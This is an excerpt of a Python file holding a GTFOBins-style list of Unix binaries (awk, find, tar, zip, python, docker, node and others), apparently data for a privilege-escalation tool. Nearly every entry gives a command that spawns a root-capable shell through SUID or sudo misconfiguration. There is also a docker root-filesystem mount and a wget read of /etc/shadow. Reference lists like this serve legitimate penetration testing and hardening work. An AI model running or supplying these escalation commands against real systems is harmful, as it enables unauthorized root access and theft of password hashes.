...
GTFOBINS = [
    {
        "binary": "awk",
        "functions": ["shell", "file_read", "file_write", "suid", "sudo"],
        "shell_cmd": "awk 'BEGIN {system(\"/bin/sh\")}'",
        "suid_cmd": "./awk 'BEGIN {system(\"/bin/sh\")}'",
    },
    ...
    {
        "binary": "docker",
        "functions": ["shell", "suid", "sudo"],
        "shell_cmd": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    },
    {"binary": "env", "functions": ["shell", "suid", "sudo"], "shell_cmd": "env /bin/sh -p"},
    {
        "binary": "find",
        "functions": ["shell", "suid", "sudo", "file_read"],
        "shell_cmd": "find . -exec /bin/sh \\; -quit",
        "suid_cmd": "find . -exec /bin/sh -p \\; -quit",
    },
    ...
    {"binary": "man", "functions": ["shell", "suid"], "shell_cmd": "man man (then !sh)"},
    {
        ...
        "shell_cmd": "nano (then ^R^X then reset; sh 1>&0 2>&0)",
    },
    {
        "binary": "nmap",
        "functions": ["shell", "suid", "sudo"],
        "shell_cmd": "nmap --interactive (then !sh)",
        "suid_cmd": "nmap --interactive (then !sh)",
    },
    {
        "binary": "perl",
        "functions": ["shell", "suid", "sudo", "reverse_shell"],
        "shell_cmd": "perl -e 'exec \"/bin/sh\";'",
    },
    {
        "binary": "php",
        "functions": ["shell", "suid", "sudo", "reverse_shell"],
        "shell_cmd": "php -r 'system(\"/bin/sh\");'",
    },
    {
        "binary": "python",
        "functions": ["shell", "suid", "sudo", "reverse_shell", "file_read"],
        "shell_cmd": "python -c 'import os; os.system(\"/bin/sh\")'",
    },
    {
        "binary": "python3",
        "functions": ["shell", "suid", "sudo", "reverse_shell", "file_read"],
        "shell_cmd": "python3 -c 'import os; os.system(\"/bin/sh\")'",
    },
    {
        "binary": "ruby",
        "functions": ["shell", "suid", "sudo", "reverse_shell"],
        "shell_cmd": "ruby -e 'exec \"/bin/sh\"'",
    },
    {
        "binary": "tar",
        "functions": ["shell", "file_read", "suid"],
        "shell_cmd": "tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    },
    ...
    {"binary": "wget", "functions": ["file_read", "file_upload"], "file_read_cmd": "wget -q -O - file:///etc/shadow"},
    {
        ...
        "shell_cmd": 'zip /tmp/x.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"',
    },
    ...
    {
        "binary": "node",
        "functions": ["shell", "suid", "reverse_shell"],
        "shell_cmd": "node -e 'child_process.spawn(\"/bin/sh\", {stdio: [0,1,2]})'",
    },
